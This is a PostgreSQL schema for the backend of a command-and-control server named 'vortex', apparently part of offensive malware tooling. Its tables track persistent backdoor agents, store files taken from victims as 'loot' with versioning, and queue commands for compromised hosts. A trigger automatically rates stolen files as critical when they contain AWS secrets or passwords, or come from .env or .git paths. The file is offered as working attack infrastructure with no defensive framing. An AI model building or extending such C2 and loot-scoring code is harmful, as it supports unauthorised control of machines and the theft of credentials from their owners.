DROP TABLE IF EXISTS vortex_commands CASCADE;
DROP TABLE IF EXISTS vortex_loot CASCADE;
DROP TABLE IF EXISTS vortex_agents CASCADE;

-- Tracks the persistent backdoor sessions
CREATE TABLE vortex_agents (
    agent_id VARCHAR(50) PRIMARY KEY,
    hostname VARCHAR(100),
    last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Stores exfiltrated files with versioning
CREATE TABLE vortex_loot (
    loot_id SERIAL PRIMARY KEY,
    agent_id VARCHAR(50) REFERENCES vortex_agents(agent_id),
    file_path VARCHAR(255),
    file_content TEXT,
    version_num INT DEFAULT 1,
    severity VARCHAR(50) DEFAULT 'LEVEL 1 - LOW',
    exfiltrated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Command Queue for Asynchronous C2 Operations
CREATE TABLE vortex_commands (
    cmd_id SERIAL PRIMARY KEY,
    agent_id VARCHAR(50) REFERENCES vortex_agents(agent_id),
    command_str VARCHAR(255),
    status VARCHAR(20) DEFAULT 'PENDING',
    queued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- AUTOMATED SCORING TRIGGER: Upgrades severity if sensitive keywords are detected
CREATE OR REPLACE FUNCTION evaluate_loot_severity()
RETURNS TRIGGER AS $$
BEGIN
    IF NEW.file_content ILIKE '%AWS_SECRET%' OR NEW.file_content ILIKE '%password%' THEN
        NEW.severity := 'LEVEL 5 - CRITICAL';
    ELSIF NEW.file_path ILIKE '%.env%' OR NEW.file_path ILIKE '%.git%' THEN
        NEW.severity := 'LEVEL 4 - HIGH';
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER trigger_loot_scoring
BEFORE INSERT ON vortex_loot
FOR EACH ROW EXECUTE FUNCTION evaluate_loot_severity();